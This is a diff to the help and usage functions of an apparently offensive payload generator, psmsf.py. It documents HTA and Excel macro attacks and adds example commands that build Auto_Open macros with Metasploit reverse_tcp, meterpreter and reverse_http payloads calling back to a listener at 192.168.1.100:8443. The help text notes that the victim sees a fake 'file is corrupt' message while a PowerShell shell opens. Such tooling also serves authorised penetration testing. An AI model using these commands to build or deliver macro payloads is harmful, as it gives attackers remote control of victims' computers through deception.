@@ -263,8 +263,8 @@ def cert_attack_help():
 
 def hta_attack_help():
     doc = ("The HTA attack will automatically generate two files, ex:\n"
-           "    index.html             - redirects browsers to use module.hta"
-           "    module.hta             - contains the malicious code"
+           "    index.html             - redirects browsers to use module.hta\n"
+           "    module.hta             - contains the malicious code\n"
            "                           - Usage: http://x.x.x.x/winodows_hta/index.html"
     )
     logging.info(doc)
@@ -272,7 +272,7 @@ def hta_attack_help():
 
 
 def macro_attack_help():
-    doc = ("The Macro attack will automatically generate a new macro, and call it\n"
+    doc = ("The Macro attack will automatically generate a new macro, and call it. "
            "Auto_Open and paste the generated code into that. This will automatically"
            "run. Note that a message will prompt to the user saying that the file is "
            "corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR!"
@@ -280,7 +280,10 @@ def macro_attack_help():
            "You should get a shell through powershell injection after that."
     )
     logging.info(doc)
-    logging.info("python psmsf.py --attacktype hta whoami")
+    logging.info("python psmsf.py --attacktype mac --payload windows/shell/reverse_tcp --lhost 192.168.1.100 --lport 8443")
+    logging.info("python psmsf.py --attacktype mac --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.100 --lport 8443")
+    logging.info("python psmsf.py --attacktype mac --payload windows/meterpreter/reverse_http --lhost 192.168.1.100 --lport 8443")
+
 
 def banner():
     banner = """
@@ -347,7 +350,7 @@ if __name__ == "__main__":
             generate_macro_attack(powershell_cmd)
         else:
             banner()
-            powershell_attack_help()
+            macro_attack_help()
 
     elif attacktype == 'crt':
         if args.filename:
